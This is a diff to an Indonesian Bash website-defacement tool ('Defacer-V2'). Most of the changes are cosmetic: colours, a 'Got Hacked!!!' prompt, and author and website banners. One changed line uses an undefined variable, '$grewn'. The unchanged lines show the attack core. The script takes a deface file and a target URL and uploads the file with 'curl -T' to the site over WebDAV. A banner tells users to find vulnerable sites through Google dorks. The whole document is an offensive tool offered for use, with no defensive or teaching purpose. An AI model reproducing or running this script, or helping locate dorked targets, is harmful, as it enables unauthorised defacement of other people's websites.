@@ -1,7 +1,7 @@
 green="\033[32;1m"
 yellow="\033[33;1m"
 indigo="\033[34;1m"
-red="\033[35;1m"
+red="\033[31;1m"
 white="\033[37;1m"
 cyan="\033[36;1m"
 clear
@@ -79,7 +79,7 @@ read -p " ╰─$ " script
 echo
 echo
 echo $white"  Masukan Target 1 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Defacer-V2"$white
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Got Hacked!!!"$white
 read -p " ╰─$ " target
 curl -T /storage/emulated/0/$script $target
 echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target"
@@ -113,7 +113,7 @@ echo
 echo
 echo $red"##############################################################"
 echo
-echo $red"Note"$white":"$green" Klik CTRL+C Untuk Keluar Jika Tidak Mau melanjutkan Lagi"
+echo $cyan"Note"$white":"$green" Klik CTRL+C Untuk Keluar Jika Tidak Mau melanjutkan Lagi"
 echo $yellow"   Dork Sama Seperti Webdav Cari Dork Nya Di Google Banyak!"
 echo
 echo $red"##############################################################"
@@ -181,9 +181,9 @@ echo
 echo
 toilet -f future "   Informasi Tools" | lolcat
 echo $red"##########################$green" WELCOME "$red###########################"
-echo $green"Author  : Chemod_zrd404			"
-echo $purple"Gthub   : https://github.com/21D4N404"
-echo $white"Blog    : http://generasicyberindo.blogspot.com"
+echo $green"Author     "$white":"$cyan" Chemod_zrd404			"
+echo $green"Gthub      "$white":"$cyan" https://github.com/21D4N404"
+echo $grewn"Website    "$white":"$cyan" www.indo-cyber.zone.id"
 echo
 echo $yellow"                          THANKS TO :"
 echo
@@ -207,7 +207,7 @@ fi
 
 if [ $apaan = "Q" ] || [ $apaan = "q" ]
 then
-echo " Terimakasih Sudah Menggunakan Tools Kami :) "
+echo $red " Terimakasih Sudah Menggunakan Tools Kami :) "
 exit
 clear
 fi
